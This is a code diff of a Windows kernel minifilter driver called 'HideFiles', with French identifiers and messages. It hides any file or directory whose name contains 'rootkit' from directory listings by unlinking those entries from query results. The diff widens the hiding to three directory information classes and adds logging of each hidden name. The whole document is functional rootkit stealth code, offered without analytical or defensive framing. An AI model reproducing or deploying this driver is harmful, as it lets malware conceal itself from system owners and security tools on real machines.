@@ -1,141 +1,197 @@
 #include <fltKernel.h>
 
-#define HIDE_KEYWORD L"rootkit"
+#define HIDE_KEYWORD     L"rootkit"
 #define HIDE_KEYWORD_LEN 7
 
-BOOLEAN ShouldHide(_In_ PWCHAR FileName, _In_ ULONG LengthInBytes)
-{
-    ULONG nameLenChars = LengthInBytes / sizeof(WCHAR);
-    ULONG i;
+#ifndef FileIdExtdBothDirectoryInformation
+#define FileIdExtdBothDirectoryInformation ((FILE_INFORMATION_CLASS)60)
+#endif
 
-    if (nameLenChars < HIDE_KEYWORD_LEN)
+typedef struct _MY_FILE_ID_EXTD {
+    ULONG         NextEntryOffset;
+    ULONG         FileIndex;
+    LARGE_INTEGER CreationTime;
+    LARGE_INTEGER LastAccessTime;
+    LARGE_INTEGER LastWriteTime;
+    LARGE_INTEGER ChangeTime;
+    LARGE_INTEGER EndOfFile;
+    LARGE_INTEGER AllocationSize;
+    ULONG         FileAttributes;
+    ULONG         FileNameLength;
+    ULONG         EaSize;
+    ULONG         ReparsePointTag;
+    BYTE          FileId[16];
+    CCHAR         ShortNameLength;
+    WCHAR         ShortName[12];
+    WCHAR         FileName[1];
+} MY_FILE_ID_EXTD, *PMY_FILE_ID_EXTD;
+
+PFLT_FILTER g_filter = NULL;
+
+static BOOLEAN doit_cacher(PWCHAR nom, ULONG len_bytes)
+{
+    ULONG nb_chars = len_bytes / sizeof(WCHAR);
+    ULONG i, j;
+
+    if (nb_chars < HIDE_KEYWORD_LEN)
         return FALSE;
 
-    for (i = 0; i <= nameLenChars - HIDE_KEYWORD_LEN; i++) {
-        ULONG j;
-        BOOLEAN match = TRUE;
+    for (i = 0; i <= nb_chars - HIDE_KEYWORD_LEN; i++) {
+        BOOLEAN ok = TRUE;
         for (j = 0; j < HIDE_KEYWORD_LEN; j++) {
-            WCHAR c1 = FileName[i + j];
-            WCHAR c2 = HIDE_KEYWORD[j];
-            if (c1 >= L'A' && c1 <= L'Z') c1 = c1 - L'A' + L'a';
-            if (c2 >= L'A' && c2 <= L'Z') c2 = c2 - L'A' + L'a';
-            if (c1 != c2) { match = FALSE; break; }
+            WCHAR a = nom[i + j];
+            WCHAR b = HIDE_KEYWORD[j];
+            if (a >= L'A' && a <= L'Z') a += (L'a' - L'A');
+            if (b >= L'A' && b <= L'Z') b += (L'a' - L'A');
+            if (a != b) { ok = FALSE; break; }
         }
-        if (match) return TRUE;
+        if (ok) return TRUE;
     }
     return FALSE;
 }
 
-FLT_POSTOP_CALLBACK_STATUS PostDirectoryControl(
-    _Inout_ PFLT_CALLBACK_DATA Data,
-    _In_ PCFLT_RELATED_OBJECTS FltObjects,
-    _In_opt_ PVOID CompletionContext,
-    _In_ FLT_POST_OPERATION_FLAGS Flags)
+static BOOLEAN get_champs(PUCHAR e, FILE_INFORMATION_CLASS cls,
+    PULONG next, PULONG namelen, PWCHAR *name)
 {
-    PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
-    PFILE_BOTH_DIR_INFORMATION entry;
-    PFILE_BOTH_DIR_INFORMATION previousEntry = NULL;
-    PUCHAR buffer;
+    if (cls == FileBothDirectoryInformation) {
+        PFILE_BOTH_DIR_INFORMATION p = (PFILE_BOTH_DIR_INFORMATION)e;
+        *next = p->NextEntryOffset;
+        *namelen = p->FileNameLength;
+        *name = p->FileName;
+        return TRUE;
+    }
+    if (cls == FileIdBothDirectoryInformation) {
+        PFILE_ID_BOTH_DIR_INFORMATION p = (PFILE_ID_BOTH_DIR_INFORMATION)e;
+        *next = p->NextEntryOffset;
+        *namelen = p->FileNameLength;
+        *name = p->FileName;
+        return TRUE;
+    }
+    if (cls == FileIdExtdBothDirectoryInformation) {
+        PMY_FILE_ID_EXTD p = (PMY_FILE_ID_EXTD)e;
+        *next = p->NextEntryOffset;
+        *namelen = p->FileNameLength;
+        *name = p->FileName;
+        return TRUE;
+    }
+    return FALSE;
+}
 
-   UNREFERENCED_PARAMETER(FltObjects);
-    UNREFERENCED_PARAMETER(CompletionContext);
-    UNREFERENCED_PARAMETER(Flags);
+FLT_POSTOP_CALLBACK_STATUS post_dir_ctrl(
+    _Inout_ PFLT_CALLBACK_DATA data,
+    _In_ PCFLT_RELATED_OBJECTS obj,
+    _In_opt_ PVOID ctx,
+    _In_ FLT_POST_OPERATION_FLAGS flags)
+{
+    PFLT_IO_PARAMETER_BLOCK iopb = data->Iopb;
+    FILE_INFORMATION_CLASS cls;
+    PUCHAR buf, cur, prev;
+
+    UNREFERENCED_PARAMETER(obj);
+    UNREFERENCED_PARAMETER(ctx);
+    UNREFERENCED_PARAMETER(flags);
 
     if (iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY)
         return FLT_POSTOP_FINISHED_PROCESSING;
 
-    if (!NT_SUCCESS(Data->IoStatus.Status) || Data->IoStatus.Information == 0)
+    if (!NT_SUCCESS(data->IoStatus.Status) || data->IoStatus.Information == 0)
         return FLT_POSTOP_FINISHED_PROCESSING;
 
-    if (iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass
-        != FileBothDirectoryInformation)
+    cls = iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass;
+    buf = (PUCHAR)iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
+    if (!buf)
         return FLT_POSTOP_FINISHED_PROCESSING;
 
-    buffer = (PUCHAR)iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
-    if (buffer == NULL)
-        return FLT_POSTOP_FINISHED_PROCESSING;
-
-    entry = (PFILE_BOTH_DIR_INFORMATION)buffer;
+    cur  = buf;
+    prev = NULL;
 
     for (;;) {
-        ULONG nextOffset = entry->NextEntryOffset;
-        BOOLEAN isLast = (nextOffset == 0);
-        BOOLEAN hide = ShouldHide(entry->FileName, entry->FileNameLength);
+        ULONG next, namelen;
+        PWCHAR name;
+        BOOLEAN last, hide;
+
+        if (!get_champs(cur, cls, &next, &namelen, &name))
+            break;
+
+        last = (next == 0);
+        hide = doit_cacher(name, namelen);
 
         if (hide) {
-            DbgPrint("HideFiles: masquage entree rootkit\n");
-            if (previousEntry == NULL) {
-                if (isLast) {
-                    Data->IoStatus.Information = 0;
+            DbgPrint("HideFiles: cache %.*S\n", namelen / 2, name);
+
+            if (prev == NULL) {
+                if (last) {
+                    data->IoStatus.Information = 0;
                     break;
                 } else {
-                    PFILE_BOTH_DIR_INFORMATION nextEntry =
-                        (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)entry + nextOffset);
-                    ULONG remainingSize = (ULONG)(Data->IoStatus.Information -
-                                         ((PUCHAR)nextEntry - buffer));
-                    RtlMoveMemory(entry, nextEntry, remainingSize);
+                    PUCHAR suivant = cur + next;
+                    ULONG reste = (ULONG)(data->IoStatus.Information - (suivant - buf));
+                    RtlMoveMemory(cur, suivant, reste);
                     continue;
                 }
             } else {
-                if (isLast)
-                    previousEntry->NextEntryOffset = 0;
+                if (last)
+                    *((PULONG)prev) = 0;
                 else
-                    previousEntry->NextEntryOffset += nextOffset;
-                if (isLast) break;
-                entry = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)entry + nextOffset);
+                    *((PULONG)prev) += next;
+
+                if (last) break;
+                cur += next;
                 continue;
             }
         }
-        if (isLast) break;
-        previousEntry = entry;
-        entry = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)entry + nextOffset);
+
+        if (last) break;
+        prev = cur;
+        cur += next;
     }
 
     return FLT_POSTOP_FINISHED_PROCESSING;
 }
 
-CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
-    { IRP_MJ_DIRECTORY_CONTROL, 0, NULL, PostDirectoryControl },
+CONST FLT_OPERATION_REGISTRATION callbacks[] = {
+    { IRP_MJ_DIRECTORY_CONTROL, 0, NULL, post_dir_ctrl },
     { IRP_MJ_OPERATION_END }
 };
 
-PFLT_FILTER gFilterHandle = NULL;
-
-NTSTATUS FilterUnloadCallback(_In_ FLT_FILTER_UNLOAD_FLAGS Flags)
+NTSTATUS unload_cb(_In_ FLT_FILTER_UNLOAD_FLAGS flags)
 {
-    UNREFERENCED_PARAMETER(Flags);
-    if (gFilterHandle != NULL) {
-        FltUnregisterFilter(gFilterHandle);
-        gFilterHandle = NULL;
+    UNREFERENCED_PARAMETER(flags);
+    if (g_filter) {
+        FltUnregisterFilter(g_filter);
+        g_filter = NULL;
     }
-    DbgPrint("HideFiles: unloaded\n");
+    DbgPrint("HideFiles: decharge\n");
     return STATUS_SUCCESS;
 }
 
-CONST FLT_REGISTRATION FilterRegistration = {
-    sizeof(FLT_REGISTRATION), FLT_REGISTRATION_VERSION, 0, NULL,
-    Callbacks, FilterUnloadCallback,
+CONST FLT_REGISTRATION reg = {
+    sizeof(FLT_REGISTRATION),
+    FLT_REGISTRATION_VERSION,
+    0, NULL,
+    callbacks,
+    unload_cb,
     NULL, NULL, NULL, NULL, NULL, NULL, NULL
 };
 
-NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
+NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT drv, _In_ PUNICODE_STRING reg_path)
 {
-    NTSTATUS status;
-    UNREFERENCED_PARAMETER(RegistryPath);
+    NTSTATUS st;
+    UNREFERENCED_PARAMETER(reg_path);
 
-    status = FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
-    if (!NT_SUCCESS(status)) {
-        DbgPrint("HideFiles: FltRegisterFilter echoue 0x%08X\n", status);
-        return status;
+    st = FltRegisterFilter(drv, &reg, &g_filter);
+    if (!NT_SUCCESS(st)) {
+        DbgPrint("HideFiles: FltRegisterFilter echec %08X\n", st);
+        return st;
     }
 
-    status = FltStartFiltering(gFilterHandle);
-    if (!NT_SUCCESS(status)) {
-        FltUnregisterFilter(gFilterHandle);
-        gFilterHandle = NULL;
-        return status;
+    st = FltStartFiltering(g_filter);
+    if (!NT_SUCCESS(st)) {
+        FltUnregisterFilter(g_filter);
+        g_filter = NULL;
+        return st;
     }
 
-    DbgPrint("HideFiles: loaded\n");
+    DbgPrint("HideFiles: charge\n");
     return STATUS_SUCCESS;
 }
